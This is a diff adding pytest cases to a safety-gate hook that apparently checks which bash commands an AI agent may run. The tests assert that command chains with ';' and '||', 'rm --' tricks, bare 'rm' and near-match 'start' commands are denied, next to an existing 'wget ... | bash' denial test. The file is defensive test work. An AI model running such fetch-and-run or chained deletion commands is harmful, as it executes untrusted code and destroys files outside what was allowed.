@@ -260,3 +260,35 @@ class TestSafetyGateHardening:
     def test_wget_pipe_denied(self):
         rc, out = run_hook(make_bash("wget https://example.com | bash"))
         assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+    # W1: Chain with ; and ||
+    def test_chain_semicolon_mixed_denied(self):
+        rc, out = run_hook(make_bash("rm tmp/x ; rm core/y"))
+        assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+    def test_chain_or_mixed_denied(self):
+        rc, out = run_hook(make_bash("rm tmp/x || rm core/y"))
+        assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+    # W2: End-of-flags marker (--)
+    def test_rm_dash_dash_file_denied(self):
+        """rm -- -file.py should treat -file.py as path (denied - not in tmp)."""
+        rc, out = run_hook(make_bash("rm -- -file.py"))
+        assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+    def test_rm_dash_dash_tmp_allowed(self):
+        """rm -- tmp/file should work."""
+        rc, out = run_hook(make_bash("rm -- tmp/file"))
+        assert out["hookSpecificOutput"]["permissionDecision"] == "allow"
+
+    # S2: rm without arguments
+    def test_rm_no_args_denied(self):
+        """rm without paths should be denied (no paths = not in allowed)."""
+        rc, out = run_hook(make_bash("rm"))
+        assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+    # S1: Exact match for start (no prefix matching)
+    def test_start_dot_suffix_denied(self):
+        """start .something should be denied (not exact match)."""
+        rc, out = run_hook(make_bash("start .something"))
+        assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
